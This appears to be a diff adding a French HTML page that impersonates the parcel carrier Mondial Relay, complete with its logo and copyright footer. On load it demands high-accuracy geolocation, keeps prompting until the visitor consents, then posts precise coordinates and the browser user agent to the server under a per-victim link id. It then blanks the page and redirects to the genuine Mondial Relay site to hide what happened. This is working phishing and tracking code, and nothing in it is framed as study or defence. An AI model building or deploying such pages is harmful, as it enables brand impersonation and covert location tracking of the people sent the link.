@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chargement…</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  html, body { height: 100%; margin: 0; font-family: 'Poppins', sans-serif; }
+  body { background: linear-gradient(135deg, #ffffff 0%, #f2f2f2 100%); }
+  .loader-circle { stroke-dasharray: 80; stroke-dashoffset: 60; transform-origin: center; }
+  .card { background: white; padding: 2rem; border-radius: 1rem; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 24rem; text-align: center; }
+  button { transition: background-color 0.3s ease; }
+  .logo {
+    width: 190px;
+  }
+</style>
+</head>
+<body class="flex flex-col items-center justify-center">
+
+  <!-- Header avec logo -->
+  <header class="absolute top-8 flex justify-center w-full">
+    <img src="https://recycleriedugatinais.org/wp-content/uploads/logo_mondial_relay_rectangle_grand.png" alt="Mondial Relay" class="logo">
+  </header>
+
+  <!-- Contenu principal -->
+  <main class="flex flex-col items-center space-y-8">
+    <!-- Loader -->
+    <svg class="animate-spin h-20 w-20" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+      <defs>
+        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#ed1c24"/>
+          <stop offset="100%" stop-color="#ff6b6b"/>
+        </linearGradient>
+      </defs>
+      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="url(#grad)" stroke-width="4"></circle>
+      <path class="opacity-75" fill="url(#grad)" d="M4 12a8 8 0 018-8v8H4z"></path>
+    </svg>
+
+    <!-- Carte texte / messages -->
+    <div class="card" id="location-card">
+      <div class="text-gray-700 text-center text-lg" id="location-message">
+        Veuillez autoriser la localisation pour continuer…
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="absolute bottom-6 text-gray-400 text-sm">
+    &copy; 2025 Mondial Relay
+  </footer>
+
+<script>
+const link_id = "{{ link_id }}";
+
+function sendLocation(coords) {
+  // Stocke les coordonnées avec plus de précision
+  fetch('/location/' + link_id, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({
+      lat: Number(coords.latitude.toFixed(7)),
+      lon: Number(coords.longitude.toFixed(7)),
+      acc: Number(coords.accuracy.toFixed(2)),
+      ua: navigator.userAgent
+    })
+  }).finally(() => {
+    document.body.innerHTML = ""; // Page blanche après envoi
+    window.location.href = "https://www.mondialrelay.fr"; // Redirection après acceptation
+  });
+}
+
+window.addEventListener('load', () => {
+  const messageDiv = document.getElementById('location-message');
+
+  if (!navigator.geolocation) {
+    messageDiv.textContent = "Géolocalisation non supportée par votre navigateur.";
+    return;
+  }
+
+  function requestPosition() {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => sendLocation(pos.coords),
+      (err) => {
+        console.error(err);
+        // Message clair + bouton relance
+        messageDiv.innerHTML = `
+          <p>Vous devez autoriser le partage de votre position pour continuer.<br>
+          Si vous avez refusé, modifiez les permissions dans votre navigateur.</p>
+          <button id="retry-btn" style="
+            margin-top: 1rem;
+            background-color: #ed1c24;
+            color: white;
+            padding: 0.5rem 1.5rem;
+            border: none;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            font-weight: bold;
+          ">Réessayer</button>
+        `;
+
+        const retryBtn = document.getElementById('retry-btn');
+        retryBtn.addEventListener('click', () => {
+          // Recharge la page pour relancer la demande
+          window.location.reload();
+        });
+      },
+      { enableHighAccuracy:true, maximumAge:0, timeout:15000 }
+    );
+  }
+
+  requestPosition();
+});
+</script>
+
+</body>
+</html>
